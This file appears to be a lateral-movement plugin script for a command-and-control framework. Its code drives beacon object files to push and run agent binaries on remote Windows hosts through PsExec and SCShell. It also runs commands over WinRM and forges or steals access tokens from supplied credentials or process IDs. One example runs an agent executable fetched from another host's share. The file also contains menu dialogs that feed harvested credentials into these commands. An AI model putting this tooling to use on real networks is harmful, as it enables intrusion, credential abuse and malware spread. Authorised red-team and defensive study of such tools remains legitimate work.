var metadata = {
    name: "LateralMovement",
    description: "BOFs for lateral movement"
};

var _cmd_jump_psexec = ax.create_command("psexec", "Attempt to spawn a session on a remote target via PsExec", "jump psexec 192.168.0.1 /tmp/agent_svc.exe -b update.exe -s C$ -p C: -n UpdateService -d UpdateService");
_cmd_jump_psexec.addArgFlagString( "-b", "binary_name",     "Remote binary name", "random");
_cmd_jump_psexec.addArgFlagString( "-s", "share",           "Share for for copying the file", "ADMIN$");
_cmd_jump_psexec.addArgFlagString( "-p", "svc_path",        "Path to the service file", "C:\\Windows");
_cmd_jump_psexec.addArgFlagString( "-n", "svc_name",        "Service name", "random");
_cmd_jump_psexec.addArgFlagString( "-d", "svc_description", "Service description", "random");
_cmd_jump_psexec.addArgString("target", true);
_cmd_jump_psexec.addArgFile("binary", true);
_cmd_jump_psexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target          = parsed_json["target"];
    let binary_content  = parsed_json["binary"];
    let share           = parsed_json["share"];
    let binary_name     = parsed_json["binary_name"];
    let svc_path        = parsed_json["svc_path"];
    let svc_name        = parsed_json["svc_name"];
    let svc_description = parsed_json["svc_description"];

    if (binary_name == "random")  binary_name = ax.random_string(8, "alphabetic") + ".exe";
    if (svc_name.length == "random")  svc_name = ax.random_string(10, "alphabetic");
    if (svc_description.length == "random")  svc_description = ax.random_string(16, "alphabetic");

    let bof_params = ax.bof_pack("cstr,bytes,cstr,cstr,cstr,cstr,cstr", [target, binary_content, binary_name, share, svc_path, svc_name, svc_description]);
    let bof_path = ax.script_dir() + "_bin/psexec." + ax.arch(id) + ".o";
    let message = `Task: Jump to ${target} via PsExec (${binary_name})`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var _cmd_jump_scshell = ax.create_command("scshell", "Attempt to spawn a session on a remote target via SCShell", "jump scshell 192.168.0.1 /tmp/agent_svc.exe -b update.exe -s C$ -p C:\\Windows -n defragsvc");
_cmd_jump_scshell.addArgFlagString( "-b", "binary_name",     "Remote binary name", "random");
_cmd_jump_scshell.addArgFlagString( "-s", "share",           "Share for copying the file", "ADMIN$");
_cmd_jump_scshell.addArgFlagString( "-p", "svc_path",        "Path to the service file", "C:\\Windows");
_cmd_jump_scshell.addArgFlagString( "-n", "svc_name",        "Service name to modify", "defragsvc");
_cmd_jump_scshell.addArgString("target", true);
_cmd_jump_scshell.addArgFile("binary", true);
_cmd_jump_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target          = parsed_json["target"];
    let binary_content  = parsed_json["binary"];
    let share           = parsed_json["share"];
    let binary_name     = parsed_json["binary_name"];
    let svc_path        = parsed_json["svc_path"];
    let svc_name        = parsed_json["svc_name"];

    if (binary_name == "random")  binary_name = ax.random_string(8, "alphabetic") + ".exe";

    let remote_unc_path = `\\\\${target}\\${share}\\${binary_name}`;
    let local_path_on_target = `${svc_path}\\${binary_name}`;

    let bof_params = ax.bof_pack("cstr,cstr,cstr,bytes", [target, svc_name, remote_unc_path, binary_content]);
    let bof_path = ax.script_dir() + "_bin/scshell." + ax.arch(id) + ".o";
    let message = `Task: Jump to ${target} via SCShell (service: ${svc_name}, binary: ${binary_name})`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var cmd_jump = ax.create_command("jump", "Attempt to spawn a session on a remote target with the specified method");
cmd_jump.addSubCommands([_cmd_jump_psexec, _cmd_jump_scshell]);



var _cmd_invoke_winrm = ax.create_command("winrm", "Use WinRM to execute commands on other systems", "invoke winrm 192.168.0.1 whoami /all");
_cmd_invoke_winrm.addArgString("target", true);
_cmd_invoke_winrm.addArgString("cmd", true);
_cmd_invoke_winrm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = parsed_json["target"];
    let cmd = parsed_json["cmd"];

    let bof_params = ax.bof_pack("wstr,wstr", [target, cmd]);
    let bof_path = ax.script_dir() + "_bin/winrm." + ax.arch(id) + ".o";
    let message = `Task: Invoke to ${target} via WinRM`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var _cmd_invoke_scshell = ax.create_command("scshell", "Use SCShell to execute commands on other systems by modifying service binary path (fileless)", "invoke scshell 10.0.2.10 defragsvc \"cmd.exe /c \\\\10.0.2.1\\share\\agent.exe\"");
_cmd_invoke_scshell.addArgString("target", true);
_cmd_invoke_scshell.addArgString("service", true);
_cmd_invoke_scshell.addArgString("payload", true);
_cmd_invoke_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let target = parsed_json["target"];
    let service = parsed_json["service"];
    let payload = parsed_json["payload"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr", [target, service, payload]);
    let bof_path = ax.script_dir() + "_bin/scshell." + ax.arch(id) + ".o";
    let message = `Task: Invoke SCShell on ${target} (service: ${service})`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});



var cmd_invoke = ax.create_command("invoke", "Attempt to execute a command on a remote target with the specified method");
cmd_invoke.addSubCommands([_cmd_invoke_winrm, _cmd_invoke_scshell]);



let hook_impersonate = function (task)
{
    let regex = /impersonated successfully:\s+([^\s]+(?:\s[^\s\(\)\[]+)*)(?:\s*\(logon:\s*(\d+)\))?(?:\s*\[(elevated)\])?/i;
    let match = task.text.match(regex);
    if(match) {
        let user = match[1].trim();
        let logonType = match[2] ? parseInt(match[2]) : null;
        let isElevated = match[3] === "elevated";

        if(logonType) { user = user + " (" + logonType + ")"; }

        ax.agent_set_impersonate(task.agent, user, isElevated);
    }
    return task;
}

var _cmd_token_make = ax.create_command("make", "Creates an impersonated token from a given credentials", "token make admin P@ssword domain.local 8");
_cmd_token_make.addArgString("username", true);
_cmd_token_make.addArgString("password", true);
_cmd_token_make.addArgString("domain", true);
_cmd_token_make.addArgInt("type", true, "Logon type: 2 - Interactive\n                                        3 - Network\n                                        4 - Batch\n                                        5 - Service\n                                        8 - NetworkCleartext\n                                        9 - NewCredentials");
_cmd_token_make.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let username = parsed_json["username"];
    let password = parsed_json["password"];
    let domain = parsed_json["domain"];
    let type = parsed_json["type"];

    let bof_params = ax.bof_pack("wstr,wstr,wstr,int", [username, password, domain, type]);
    let bof_path = ax.script_dir() + "_bin/token_make." + ax.arch(id) + ".o";
    let message = `Task: make access token for ${domain}\\${username}`;

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message, hook_impersonate);
});

var _cmd_token_steal = ax.create_command("steal", "Steal access token from a process", "token steal 608");
_cmd_token_steal.addArgInt("pid", true);
_cmd_token_steal.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let pid = parsed_json["pid"];
    let bof_params = ax.bof_pack("int", [pid]);
    let bof_path = ax.script_dir() + "_bin/token_steal." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "Task: steal access token", hook_impersonate);
});

var cmd_token = ax.create_command("token", "Impersonate token");
cmd_token.addSubCommands([_cmd_token_make, _cmd_token_steal]);



var group_test = ax.create_commands_group("LateralMovement-BOF", [cmd_jump, cmd_invoke, cmd_token]);
ax.register_commands_group(group_test, ["beacon", "gopher"], ["windows"], []);



/// MENU PROCESS

let token_steal_action = menu.create_action("Steal token", function(process_list) {
    if (process_list.length > 0 ) {
        let proc = process_list[0];
        ax.execute_command(proc.agent_id, "token steal " + proc.pid);
    }
});
menu.add_processbrowser(token_steal_action, ["beacon", "gopher"], ["windows"]);

let token_make_action = menu.create_action("Make token", function(agent_list) {
    if (agent_list.length > 0 ) {

        let map_logon = { "LOGON_INTERACTIVE": 2, "LOGON_NETWORK": 3, "LOGON_BATCH": 4, "LOGON_SERVICE": 5, "LOGON_NETWORK_CLEARTEXT":8, "LOGON_NEW_CREDENTIALS":9 };

        let creds_selector = form.create_selector_credentials(["username", "password", "realm", "tag"]);
        creds_selector.setSize(800, 400);

        let username_label = form.create_label("Username:");
        let username_text  = form.create_textline();
        let select_button  = form.create_button("...");
        let password_label = form.create_label("Password:");
        let password_text  = form.create_textline();
        let realm_label    = form.create_label("Realm:");
        let realm_text     = form.create_textline();
        let logon_label    = form.create_label("Logon type:");
        let logon_combo    = form.create_combo();
        logon_combo.setItems(["LOGON_INTERACTIVE", "LOGON_NETWORK", "LOGON_BATCH", "LOGON_SERVICE", "LOGON_NETWORK_CLEARTEXT", "LOGON_NEW_CREDENTIALS"]);
        logon_combo.setCurrentIndex(5);

        form.connect(select_button, "clicked", function(){
            let cred_list = creds_selector.exec();
            if (cred_list.length > 0) {
                let cred = cred_list[0];
                if(cred["realm"].length == 0) { cred["realm"] = "."; }
                username_text.setText(cred["username"]);
                password_text.setText(cred["password"]);
                realm_text.setText(cred["realm"]);
            }
        });

        let layout = form.create_gridlayout();
        layout.addWidget(username_label, 0, 0, 1, 1);
        layout.addWidget(username_text,  0, 1, 1, 1);
        layout.addWidget(select_button,  0, 2, 1, 1);
        layout.addWidget(password_label, 1, 0, 1, 1);
        layout.addWidget(password_text,  1, 1, 1, 1);
        layout.addWidget(realm_label,    2, 0, 1, 1);
        layout.addWidget(realm_text,     2, 1, 1, 1);
        layout.addWidget(logon_label,    3, 0, 1, 1);
        layout.addWidget(logon_combo,    3, 1, 1, 1);

        let dialog = form.create_dialog("Make token");
        dialog.setSize(440, 200);
        dialog.setLayout(layout);
        dialog.setButtonsText("Make", "Cancel");
        while(dialog.exec()) {
            if(username_text.text().length == 0 || password_text.text().length == 0 || realm_text.text().length == 0) { continue; }

            let command = `token make ${username_text.text()} "${password_text.text()}" ${realm_text.text()} ${map_logon[logon_combo.currentText()]}`;
            agent_list.forEach(id => ax.execute_command(id, command));
            break;
        }
    }
});
menu.add_session_access(token_make_action, ["beacon", "gopher"], ["windows"]);



/// MENU TARGETS

let psexec_action = menu.create_action("PsExec", function(targets_id) {
    let agents_selector = form.create_selector_agents(["id", "type", "computer", "username", "process", "pid", "tags"]);
    agents_selector.setSize(1000, 400);

    let label_format = form.create_label("Target format:");
    let combo_format = form.create_combo();
    combo_format.addItems(["FQDN", "IP address"]);

    let label_file  = form.create_label("Payload file:");
    let text_file   = form.create_textline();
    let button_file = form.create_button("...");

    let agent_label   = form.create_label("Session:");
    let agent_text    = form.create_textline();
    let select_button = form.create_button("...");

    let hline = form.create_hline()

    let share_label = form.create_label("Share:");
    let share_text  = form.create_textline();
    share_text.setPlaceholder("Default: ADMIN$");

    let path_label = form.create_label("Remote path:");
    let path_text  = form.create_textline();
    path_text.setPlaceholder("Default: C:\\Windows");

    let bin_name_label = form.create_label("Binary name:");
    let bin_name_text  = form.create_textline();
    bin_name_text.setPlaceholder("Default: random");

    let svc_name_label = form.create_label("Svc Name:");
    let svc_name_text  = form.create_textline();
    svc_name_text.setPlaceholder("Default: random");

    let svc_desc_label = form.create_label("Svc Description:");
    let svc_desc_text  = form.create_textline();
    svc_desc_text.setPlaceholder("Default: random");

    let layout = form.create_gridlayout();
    layout.addWidget(label_format,   0, 0, 1, 1);
    layout.addWidget(combo_format,   0, 1, 1, 2);
    layout.addWidget(label_file,     1, 0, 1, 1);
    layout.addWidget(text_file,      1, 1, 1, 1);
    layout.addWidget(button_file,    1, 2, 1, 1);
    layout.addWidget(agent_label,    2, 0, 1, 1);
    layout.addWidget(agent_text,     2, 1, 1, 1);
    layout.addWidget(select_button,  2, 2, 1, 1);
    layout.addWidget(hline,          3, 0, 1, 3);
    layout.addWidget(share_label,    4, 0, 1, 1);
    layout.addWidget(share_text,     4, 1, 1, 2);
    layout.addWidget(path_label,     5, 0, 1, 1);
    layout.addWidget(path_text,      5, 1, 1, 2);
    layout.addWidget(bin_name_label, 6, 0, 1, 1);
    layout.addWidget(bin_name_text,  6, 1, 1, 2);
    layout.addWidget(svc_name_label, 7, 0, 1, 1);
    layout.addWidget(svc_name_text,  7, 1, 1, 2);
    layout.addWidget(svc_desc_label, 8, 0, 1, 1);
    layout.addWidget(svc_desc_text,  8, 1, 1, 2);

    form.connect(select_button, "clicked", function(){
        let agents = agents_selector.exec();
        if (agents.length > 0) {
            let agent = agents[0];
            agent_text.setText(agent["id"]);
        }
    });

    form.connect(button_file, "clicked", function() {
        text_file.setText( ax.prompt_open_file() );
    });

    let dialog = form.create_dialog("Jump using PsExec");
    dialog.setSize(500, 300);
    dialog.setLayout(layout);
    dialog.setButtonsText("Execute", "Cancel");
    while ( dialog.exec() == true )  {
        let payload_path = text_file.text();
        if(payload_path.length == 0) { ax.show_message("Error", "Payload not specified"); continue; }

        let payload_content = ax.file_read(payload_path);
        if(payload_content.length == 0) { ax.show_message("Error", `file ${payload_path} not readed`); continue; }

        let format = combo_format.currentText();
        let agent_id = agent_text.text();

        let command_params = "";
        if (share_text.text().length)    { command_params += ` -s "${share_text.text()}"`; }
        if (path_text.text().length)     { command_params += ` -p "${path_text.text()}"`; }
        if (bin_name_text.text().length) { command_params += ` -b "${bin_name_text.text()}"`; }
        if (svc_name_text.text().length) { command_params += ` -n "${svc_name_text.text()}"`; }
        if (svc_desc_text.text().length) { command_params += ` -d "${svc_desc_text.text()}"`; }

        let targets = ax.targets()
        targets_id.forEach((id) => {
            let addr = targets[id].address;
            if(format == "FQDN") { addr = targets[id].computer; }
            if(addr.length == 0 ) {
                ax.show_message("Error", "Target is empty!");
            }
            else {
                let command = `jump psexec ${addr} ${payload_path}`;
                if (command_params.length > 0)
                    command += command_params;

                ax.execute_command(agent_id, command);
            }
        });
        break;
    }
});

let jump_menu = menu.create_menu("Jump to   ");
jump_menu.addItem(psexec_action)
menu.add_targets(jump_menu, "top");



let winrm_action = menu.create_action("WinRM", function(targets_id) {
    let agents_selector = form.create_selector_agents(["id", "type", "computer", "username", "process", "pid", "tags"]);
    agents_selector.setSize(1000, 400);

    let label_format = form.create_label("Target format:");
    let combo_format = form.create_combo();
    combo_format.addItems(["FQDN", "IP address"]);

    let label_command = form.create_label("Command:");
    let text_command  = form.create_textmulti();

    let agent_label   = form.create_label("Session:");
    let agent_text    = form.create_textline();
    let select_button = form.create_button("...");

    let layout = form.create_gridlayout();
    layout.addWidget(label_format,  0, 0, 1, 1);
    layout.addWidget(combo_format,  0, 1, 1, 2);
    layout.addWidget(label_command, 1, 0, 1, 1);
    layout.addWidget(text_command,  1, 1, 1, 2);
    layout.addWidget(agent_label,   2, 0, 1, 1);
    layout.addWidget(agent_text,    2, 1, 1, 1);
    layout.addWidget(select_button, 2, 2, 1, 1);

    form.connect(select_button, "clicked", function(){
        let agents = agents_selector.exec();
        if (agents.length > 0) {
            let agent = agents[0];
            agent_text.setText(agent["id"]);
        }
    });

    let dialog = form.create_dialog("Invoke using WinRM");
    dialog.setSize(400, 180);
    dialog.setLayout(layout);
    dialog.setButtonsText("Execute", "Cancel");
    while ( dialog.exec() == true )  {

        let target_cmd = text_command.text();
        if(target_cmd.length == 0) { ax.show_message("Error", "Command not specified"); continue; }

        let format = combo_format.currentText();
        let agent_id = agent_text.text();

        let targets = ax.targets()
        targets_id.forEach((id) => {
            let addr = targets[id].address;
            if(format == "FQDN") { addr = targets[id].computer; }
            if(addr.length == 0 ) {
                ax.show_message("Error", "Target is empty!");
            }
            else {
                let command = `invoke winrm ${addr} ${target_cmd}`;
                ax.execute_command(agent_id, command);
            }
        });
        break;
    }
});

let invoke_menu = menu.create_menu("Invoke on   ");
invoke_menu.addItem(winrm_action)
menu.add_targets(invoke_menu, "top");
